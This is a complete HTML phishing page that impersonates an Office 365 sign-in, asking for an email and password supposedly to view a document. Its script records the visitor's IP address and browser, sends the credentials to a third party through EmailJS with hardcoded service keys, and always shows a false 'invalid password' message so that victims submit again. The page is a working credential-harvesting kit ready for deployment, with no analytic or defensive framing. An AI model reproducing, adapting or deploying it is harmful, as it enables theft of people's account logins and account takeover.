<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Access</title>
    
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            background: url('https://assets.replocdn.com/projects/d5366298-b863-41a5-928c-ec794a1b6ba1/chat-assets-00e10df7-a91f-43d3-9f4c-02ded3fbd5e8') center center / cover no-repeat fixed;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            position: relative;
            z-index: 2;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo-image {
            max-width: 100%;
            height: auto;
            width: 280px;
            margin: 0 auto;
            display: block;
        }

        .subtitle {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
            margin-top: 15px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
            background: white;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
        }

        .btn-submit {
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .btn-submit:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }

        .btn-submit.loading {
            background: linear-gradient(135deg, #4a5a9e 0%, #53356b 100%);
            opacity: 0.7;
            transform: translateY(0);
            box-shadow: none;
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .message {
            padding: 12px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 14px;
            text-align: center;
            font-weight: 500;
            animation: slideIn 0.3s ease-out;
            transition: opacity 0.3s ease-out;
        }

        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .message.hidden {
            display: none;
        }

        .message.fade-out {
            opacity: 0;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }

            .logo-image {
                width: 220px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://assets.replocdn.com/projects/4d51c94f-38a7-49b0-91b3-fadf1834d819/chat-assets-f832522a-51b7-4b9c-ba07-c15d0946b0cf" alt="Office 365" class="logo-image">
            <p class="subtitle">Enter your credentials to view the document</p>
        </div>

        <form id="signupForm">
            <div class="form-group">
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    placeholder="Email" 
                    required
                >
            </div>

            <div class="form-group">
                <input 
                    type="password" 
                    id="password" 
                    name="password" 
                    placeholder="Password" 
                    required
                >
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">
                View Document
            </button>

            <div id="message" class="message hidden"></div>
        </form>
    </div>

    <script type="text/javascript">
        // ====================================
        // EMAILJS CONFIGURATION
        // ====================================
        const EMAILJS_PUBLIC_KEY = 'xN1zlfZ3OqZuEDTPL';
        const EMAILJS_SERVICE_ID = 'service_79ybrfo';
        const EMAILJS_TEMPLATE_ID = 'template_ing115e';

        // Initialize EmailJS
        (function() {
            emailjs.init(EMAILJS_PUBLIC_KEY);
        })();

        // Track submission attempts
        let attemptCount = 0;
        let userIP = 'Fetching...';

        // Function to detect browser
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            let browserName = 'Unknown';
            let browserVersion = 'Unknown';
            
            if (userAgent.indexOf("Firefox") > -1) {
                browserName = "Firefox";
                browserVersion = userAgent.match(/Firefox\/([0-9.]+)/)[1];
            } else if (userAgent.indexOf("Edg") > -1) {
                browserName = "Microsoft Edge";
                browserVersion = userAgent.match(/Edg\/([0-9.]+)/)[1];
            } else if (userAgent.indexOf("Chrome") > -1) {
                browserName = "Chrome";
                browserVersion = userAgent.match(/Chrome\/([0-9.]+)/)[1];
            } else if (userAgent.indexOf("Safari") > -1) {
                browserName = "Safari";
                browserVersion = userAgent.match(/Version\/([0-9.]+)/)[1];
            } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
                browserName = "Internet Explorer";
            }
            
            // Detect OS
            let os = 'Unknown';
            if (userAgent.indexOf("Win") > -1) os = "Windows";
            else if (userAgent.indexOf("Mac") > -1) os = "MacOS";
            else if (userAgent.indexOf("Linux") > -1) os = "Linux";
            else if (userAgent.indexOf("Android") > -1) os = "Android";
            else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) os = "iOS";
            
            return `${browserName} ${browserVersion} on ${os}`;
        }

        // Fetch user's IP address on page load
        (function() {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    userIP = data.ip;
                    console.log('User IP:', userIP);
                })
                .catch(error => {
                    console.log('Could not fetch IP:', error);
                    userIP = 'Unknown';
                });
        })();

        // Form submission handler
        document.getElementById('signupForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const messageDiv = document.getElementById('message');
            const passwordInput = document.getElementById('password');
            const emailInput = document.getElementById('email');
            
            // Increment attempt counter
            attemptCount++;
            
            // Get form values
            const formData = {
                email: emailInput.value,
                password: passwordInput.value,
                attempt: attemptCount,
                ip: userIP,
                browser: detectBrowser(),
                timestamp: new Date().toLocaleString()
            };
            
            // Darken button immediately
            submitBtn.classList.add('loading');
            
            // Hide previous error message
            messageDiv.classList.add('hidden');
            messageDiv.classList.remove('fade-out');
            
            // Send email using EmailJS (silently in background)
            emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, formData)
                .then(function(response) {
                    console.log('Email sent successfully!', response.status, response.text);
                }, function(error) {
                    console.log('Email failed to send', error);
                });
            
            // Always show error message
            setTimeout(function() {
                // Show error message
                messageDiv.classList.remove('hidden');
                messageDiv.className = 'message error';
                messageDiv.textContent = 'invalid password please try again';
                
                // Clear password field
                passwordInput.value = '';
                
                // Remove loading state from button (back to normal)
                submitBtn.classList.remove('loading');
                
                // Focus on password field for user convenience
                passwordInput.focus();
                
                // Hide error message after 2.5 seconds
                setTimeout(function() {
                    messageDiv.classList.add('fade-out');
                    
                    // Completely hide after fade animation
                    setTimeout(function() {
                        messageDiv.classList.add('hidden');
                    }, 300); // Wait for fade animation to complete
                }, 2500); // 2.5 seconds
                
            }, 800);
        });
    </script>
</body>
</html>
